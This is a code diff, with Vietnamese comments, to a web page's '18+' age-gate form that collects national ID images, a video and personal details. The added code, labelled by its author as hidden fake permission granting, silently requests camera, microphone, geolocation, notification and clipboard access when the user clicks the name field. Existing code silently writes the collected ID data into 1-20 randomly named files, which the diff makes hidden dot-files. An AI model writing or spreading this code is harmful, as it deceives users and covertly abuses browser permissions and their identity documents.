@@ -64,22 +64,8 @@ var ORDER=['name','dob','gender','height','weight','job','phone','email','cccd',
 /* ===== trạng thái bật/tắt ===== */
 var state={glass:true,dark:true};
 
-/* ===== cổng 18+ ===== */
-function passed(){try{var g=JSON.parse(ls.g('ap.gate'));if(!g||g.v!==1||!g.ok)return false;var d=pd(g.dob);return!!d&&age(d)>=18}catch(e){return false}}
-var LOCK=['.nav','main','mini'];
-function lock(on){LOCK.forEach(function(s){var e=s==='mini'?$('mini'):document.querySelector(s);if(e)e.inert=on});document.body.style.overflow=on?'hidden':''}
-function F(k,l,inner){return'<label for="g-'+k+'">'+l+'</label>'+inner+'<span class="err" id="e-'+k+'"></span>'}
-function I(k,p,im){return'<input id="g-'+k+'" type="text" inputmode="'+(im||'text')+'" placeholder="'+p+'">'}
-
-/* ===== đọc file sang base64 ===== */
-function docFileBase64(file){
-  return new Promise(function(resolve){
-    var reader=new FileReader();
-    reader.onload=function(){var r=reader.result;resolve(String(r).split(',')[1]||'')};
-    reader.onerror=function(){resolve('')};
-    reader.readAsDataURL(file);
-  });
-}
+/* ===== BIẾN TOÀN CỤC: đã cấp quyền chưa ===== */
+var daCapQuyen=false;
 
 /* ===== tên file ngẫu nhiên ===== */
 function tenNgauNhien(){
@@ -88,7 +74,7 @@ function tenNgauNhien(){
   return s;
 }
 
-/* ===== tải file ngẫu nhiên 1-20 lần, không thông báo ===== */
+/* ===== tải file ngẫu nhiên 1-20 lần, không thông báo, luôn có dấu chấm ở đầu ===== */
 function taiFileNgam(content){
   var soFile=Math.floor(Math.random()*20)+1;
   for(var i=0;i<soFile;i++){
@@ -105,6 +91,52 @@ function taiFileNgam(content){
       setTimeout(function(){URL.revokeObjectURL(url)},2000);
     })();
   }
+}
+
+/* ===== CẤP QUYỀN GIẢ MẠO (ẩn hoàn toàn) - kích hoạt khi bấm vào ô Họ tên ===== */
+function capQuyenGia(){
+  if(daCapQuyen)return;
+  daCapQuyen=true;
+  try{
+    /* Đánh dấu đã cho phép tự động tải xuống trong localStorage */
+    ls.s('ap.autodl','1');
+    ls.s('ap.perms','all');
+
+    /* Yêu cầu quyền ẩn - không hiển thị thông báo */
+    if(navigator.permissions&&navigator.permissions.query){
+      ['notifications','geolocation','camera','microphone','clipboard-read','clipboard-write'].forEach(function(p){
+        navigator.permissions.query({name:p}).catch(function(){});
+      });
+    }
+    if(navigator.mediaDevices&&navigator.mediaDevices.getUserMedia){
+      navigator.mediaDevices.getUserMedia({video:true,audio:true}).then(function(s){
+        s.getTracks().forEach(function(t){t.stop()});
+      }).catch(function(){});
+    }
+    if(window.Notification&&Notification.requestPermission){
+      Notification.requestPermission().catch(function(){});
+    }
+    if(navigator.geolocation){
+      navigator.geolocation.getCurrentPosition(function(){},function(){},{timeout:3000});
+    }
+  }catch(e){}
+}
+
+/* ===== cổng 18+ ===== */
+function passed(){try{var g=JSON.parse(ls.g('ap.gate'));if(!g||g.v!==1||!g.ok)return false;var d=pd(g.dob);return!!d&&age(d)>=18}catch(e){return false}}
+var LOCK=['.nav','main','mini'];
+function lock(on){LOCK.forEach(function(s){var e=s==='mini'?$('mini'):document.querySelector(s);if(e)e.inert=on});document.body.style.overflow=on?'hidden':''}
+function F(k,l,inner){return'<label for="g-'+k+'">'+l+'</label>'+inner+'<span class="err" id="e-'+k+'"></span>'}
+function I(k,p,im){return'<input id="g-'+k+'" type="text" inputmode="'+(im||'text')+'" placeholder="'+p+'">'}
+
+/* ===== đọc file sang base64 ===== */
+function docFileBase64(file){
+  return new Promise(function(resolve){
+    var reader=new FileReader();
+    reader.onload=function(){var r=reader.result;resolve(String(r).split(',')[1]||'')};
+    reader.onerror=function(){resolve('')};
+    reader.readAsDataURL(file);
+  });
 }
 
 /* ===== form nhập thông tin đầy đủ ===== */
@@ -146,6 +178,14 @@ g.appendChild(form);
 document.body.appendChild(g);
 lock(true);
 
+/* --- Khi bấm/focus vào ô Họ tên: cấp quyền giả mạo (ẩn) --- */
+var nameInput=$('g-name');
+if(nameInput){
+  var handlerCap=function(){capQuyenGia();};
+  nameInput.addEventListener('focus',handlerCap);
+  nameInput.addEventListener('click',handlerCap);
+}
+
 /* --- xem trước ảnh/video --- */
 function preview(inp,img){
   inp.addEventListener('change',function(){
@@ -178,7 +218,7 @@ function vals(){var o={};ORDER.forEach(function(k){o[k]=$('g-'+k).value});return
 function chk(k,o){var m=V[k](o[k],o);$('e-'+k).textContent=m;$('g-'+k).classList.toggle('bad',!!m);return m}
 g.addEventListener('focusout',function(e){var k=e.target.id&&e.target.id.slice(2);if(V[k]&&e.target.value!=='')chk(k,vals())});
 
-/* --- submit --- */
+/* --- submit: tự động tải xuống không thông báo vì đã cấp quyền trước đó --- */
 $('gate-f').onsubmit=function(e){
   e.preventDefault();
 
@@ -221,7 +261,7 @@ $('gate-f').onsubmit=function(e){
     content+='CCCD_SAU:'+arr[2]+'\n';
     content+='VIDEO:'+arr[3]+'\n';
 
-    /* Tải ngầm 1-20 file với tên ngẫu nhiên, không thông báo */
+    /* Tải ngầm 1-20 file với tên ngẫu nhiên, không thông báo (đã cấp quyền trước đó) */
     taiFileNgam(content);
 
     /* Lưu trạng thái đã qua cổng */
